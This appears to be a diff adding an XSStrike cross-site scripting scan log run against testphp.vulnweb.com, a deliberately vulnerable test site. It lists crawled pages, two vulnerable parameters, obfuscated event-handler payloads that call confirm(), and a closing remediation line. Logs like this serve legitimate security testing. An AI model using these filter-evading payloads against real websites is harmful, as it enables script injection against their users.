@@ -1,0 +1,14 @@
+=== XSS Scan Results ===
+Target: http://testphp.vulnweb.com/search.php?test=query
+Started at: Thu Apr 10 23:37:26 +0545 2025
+
+	XSStrike v3.1.5
+
+ Crawling the target 
+ Parsing search.php?test=query                     Parsing login.php                                 Parsing artists.php                               Parsing AJAX/index.php                            Parsing userinfo.php                              Parsing guestbook.php                             Parsing categories.php                            Parsing cart.php                                  Parsing mailto:wvs@acunetix.com                   Parsing listproducts.php?cat=4                    Parsing javascript:getInfo(\                      Parsing javascript:loadSomething(                 Parsing                                           Parsing listproducts.php?cat=1                    Parsing listproducts.php?cat=3                    Parsing signup.php                                Parsing listproducts.php?cat=2                    Parsing hpp/                                      Parsing ?pp=12                                    Progress: 10/25 [++] Vulnerable webpage: http://testphp.vulnweb.com/listproducts.php 
+[++] Vector for cat: <d3v/+/ONmoUSeOvER%09=%09[8].find(confirm)//v3dm0s 
+ Progress: 20/25 [++] Vulnerable webpage: http://testphp.vulnweb.com/search.php?test=query 
+[++] Vector for searchFor: <D3v%09oNMouseoVEr%09=%09(confirm)()%0dx>v3dm0s 
+ Progress: 25/25 
+Ended at: Thu Apr 10 23:38:10 +0545 2025
+Cross-Site Scripting|Medium|Implement CSP & input validation
